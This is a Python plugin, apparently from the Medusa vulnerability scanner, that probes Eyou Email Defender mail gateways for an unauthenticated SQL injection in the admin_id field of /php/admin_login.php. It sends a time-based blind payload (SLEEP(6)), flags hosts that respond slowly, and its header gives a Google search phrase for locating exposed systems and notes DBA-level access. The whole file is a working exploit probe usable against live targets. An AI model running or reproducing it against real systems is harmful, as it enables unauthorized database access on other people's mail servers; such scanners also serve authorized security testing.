#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 亿邮Email Defender系统免登陆DBA注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0135406
author: Ascotbe
reference: Lucifer
description: google关键字"反垃圾邮件网关 - 亿邮通讯", 参数admin_id未经过滤导致SQL注入，DBA权限。
'''
import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


post_data = {
    "admin_id": "a' AND (SELECT * FROM (SELECT(SLEEP(6)))WAcW) AND 'oHiR'='oHiR",
    "admin_pass": "a"
}
payload="/php/admin_login.php"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    start_time = time.time()
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=10, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=10, verify=False)
        con = resp.text
        code = resp.status_code

        if time.time() - start_time >= 6:
            Medusa = "{} 存在亿邮Defender系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass